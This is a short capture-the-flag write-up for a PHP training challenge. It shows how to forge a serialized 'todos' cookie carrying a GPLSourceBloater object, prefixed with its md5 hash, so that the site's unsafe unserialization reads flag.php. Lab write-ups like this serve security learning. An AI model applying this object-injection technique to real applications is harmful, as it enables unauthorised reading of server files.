## Challange
Read the file `flag.php`.
## Solution
In  `http://free.training.jinblack.it/?source` we see the source code of the program. In case the cookie `todos` is present, the content will be unserialized and rendered in the main page.

Always from the source page we can see a class called `GPLSourceBloater` which has a method `toString()` that concat the file `license.txt` with a file `source`.

If we craft a cookie in this way:
```php
class GPLSourceBloater{

  public $source="flag.php";
}

$r = new GPLSourceBloater();
$todos[] = $r;
$m = serialize($todos);
$h = md5($m);
echo $h.urlencode($m);
```
Is possible, by setting the cookie using PostMan and sending the request, to get the content of `flag.php`.

Notice that the object `$r` should be put inside an array to properly work and the cookie should be craft with the `md5` of the serialized version concatenated with the urlencoded version of the same object.

